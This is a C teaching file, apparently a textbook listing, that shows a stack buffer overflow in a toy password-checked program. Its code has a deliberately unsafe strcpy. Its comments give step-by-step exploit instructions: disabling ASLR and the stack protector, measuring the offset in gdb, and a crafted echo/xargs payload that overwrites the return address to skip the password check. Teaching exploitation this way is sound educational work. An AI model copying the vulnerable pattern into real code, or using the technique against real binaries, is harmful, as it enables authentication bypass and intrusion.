#include <stdio.h>
#include <string.h>

// The steps to reprocude this at home are a little bit technical
// 1. First we need to disable a couple of security features that prevent this
//    kind of exploit. Disable the Address Space Layout Randomization on your
//    system to have security_critical_function at a deterministic address with
//    the following command:
//    echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
//
//    Next we compile without the stack protector, and we create a static
//    binary to have security_critical_function at an easily identifiable
//    location:
//    gcc -fno-stack-protector listing3.c -g -static -o prog
//
//    Keep in mind that each time you modify and recompile the program, the
//    memory layout will change and you have to redo steps 2 and onwards
//
// 2. A semi-difficult thing is to measure the distance in bytes between the
//    start of local_buffer and the return address of preprocess_input on the
//    stack. I used gdb and put a breakpoint on preprocess_input. Once the
//    breakpoint is reached, I print the address of the local buffer I wish
//    to overflow:
//
//    (gdb) p &local_buffer
//    $1 = (char (*)[16]) 0x7fffffffe220
//
//    That's an address on the stack and the return address is stored
//    somewhere above. To find where the return address is I first look for
//    its value:
//    (gdb) info frame
//    [...] saved rip = 0x401d0c
//
//    The return address is 0x401d0c! Now let's find it on the stack by
//    printing the stack content, starting from the stack pointer (RSP register)
//    (gdb) x/wx $rsp
//    0x7fffffffe210:	0x004a90a0  // nope
//    (gdb) x/wx $rsp+8
//    0x7fffffffe218:	0xffffe651  // nope
//    (gdb) x/wx $rsp+16
//    0x7fffffffe220:	0x00000000  // nope
//    (gdb) x/wx $rsp+24
//    0x7fffffffe228:	0x00400488  // nope
//    (gdb) x/wx $rsp+32
//    0x7fffffffe230:	0xffffe250  // nope
//    (gdb) x/wx $rsp+40
//    0x7fffffffe238:	0x00401d0c  // found it!
//
//    So the offset between the start of the buffer we want to overflow and
//    the return address is:
//    0x7fffffffe238 - 0x7fffffffe220 = 0x18 (i.e. 24 bytes)
//    Conclusion: there are 24 bytes between local_buffer and the return address
//
// 3. Next we need to craft our payload, it should be consituted of 24 bytes
//    of padding, followed by the value we want to overwrite the return address
//    with, i.e. the address of security_critical_function. We can find it
//    easily:
//    nm prog | grep security_critical_function
//
//    In my case it is at 0x401c8d:
//    0000000000401c8d T security_critical_function
//
//    So my payload will be: [24 bytes of padding][0x401c8d]
//
// 4. We cannot inject bytes directly from the command line arguments, as what
//    we put there are characters that get encoded with ascii code in memory,
//    so we use echo -e to generate bytes than we feed these as the command
//    line parameter to our target using xargs:
//
//    echo -e "\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x8d\x1c\x40\x00\x00\x00\x00\x00" | xargs --null -t -n1 ./prog
//
//    Notice how we have 24 bytes of garbage (\x11) and then the address of
//    security_critical_function that will overwrite the return address:
//    \x8d\x1c\x40\x00\x00\x00\x00\x00 (in reverse order because x86-64 is
//    little endian)
//
// Don't forget to re-enable ASLR when you are done:
// echo 2 | sudo tee /proc/sys/kernel/randomize_va_space


char *password = "super-secret-password";

void security_critical_function() {
    printf("launching nukes!!\n");
}

void preprocess_input(char *string) {
    char local_buffer[16];
    strcpy(local_buffer, string); // Oopsie!

    /* work on local buffer ... */
    return;
}

int main(int argc, char **argv) {
    if (argc != 2) {
        printf("usage: %s <password>\n", argv[0]);
        return -1;
    }

    preprocess_input(argv[1]);

    if(!strncmp(password, argv[1], strlen(password)))
        security_critical_function();
    else
        printf("Unauthorized user!\n");


    return 0;
}
